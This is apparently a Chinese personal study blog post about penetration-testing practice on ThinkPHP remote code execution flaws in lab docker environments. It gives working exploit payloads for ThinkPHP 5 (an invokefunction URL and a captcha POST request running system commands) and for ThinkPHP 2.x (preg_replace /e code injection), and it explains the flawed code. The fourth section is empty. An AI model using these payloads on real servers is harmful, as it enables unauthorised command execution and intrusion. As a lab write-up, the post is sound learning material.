---
title: "渗透gogogo_day1"
image: ''
pinned: false
comment: true
published: 2026-06-04
updated: 2026-06-08
description: "渗透"
category: 学习
tags: [学习]
---

# 1.简单的thinkphp-rce



ThinkPHP 5 某些版本中，路由参数可控，攻击者可以通过 invokefunction 调用任意 PHP 函数，最终调用 system 执行系统命令。

## Payload：

```
http://xxxxxxx:8080/index.php?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=id
```

成功回显 uid/gid 信息，说明命令执行成功。



---



# 2.简单的thinkphp-rce

![image-20260604214457189](/images/image-20260604214457189.png)

````
# ThinkPHP5 5.0.23 远程代码执行漏洞

ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。

参考链接：

- https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003

## 漏洞环境

执行如下命令启动一个默认的thinkphp 5.0.23环境：

```
docker compose up -d
```

环境启动后，访问`http://your-ip:8080`即可看到默认的ThinkPHP启动页面。

## 漏洞复现

发送数据包：

```
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

成功执行`id`命令：
````



---



# 3.ThinkPHP2.x_rce

**ThinkPHP 2.x 任意代码执行漏洞**

ThinkPHP是一个在中国被广泛使用的PHP框架。ThinkPHP 2.x版本中存在一个远程代码执行漏洞。

在ThinkPHP 2.x版本中，框架使用`preg_replace`的`/e`模式匹配路由：

```php
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```

这个实现导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。值得注意的是，ThinkPHP 3.0版本在Lite模式下也存在这个漏洞，因为这个问题在该模式下并未被修复。

**环境搭建**

执行如下命令启动ThinkPHP 2.1的Demo应用：

```
docker compose up -d
```

环境启动后，访问`http://your-ip:8080/Index/Index`即可查看到默认页面。

**漏洞复现**

通过URL参数注入PHP代码来利用此漏洞。直接访问`http://your-ip:8080/index.php?s=/index/index/name/${@phpinfo()}`，服务器将执行`phpinfo()`函数，证明远程代码执行漏洞利用成功：



```
$res = preg_replace(
    '@(\w+)'.$depr.'([^'.$depr.'\/]+)@e',
    '$var[\'\\1\']="\\2";',
    implode($depr,$paths)
);
```

```
@(\w+) / ([^/]+) @e
```

匹配：

```
参数名/参数值
```

然后替换成正式业务逻辑。

```
@...@e
```

会使得内容被当成代码执行，造成任意代码执行的 `rce`。



---



# 4.

















---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
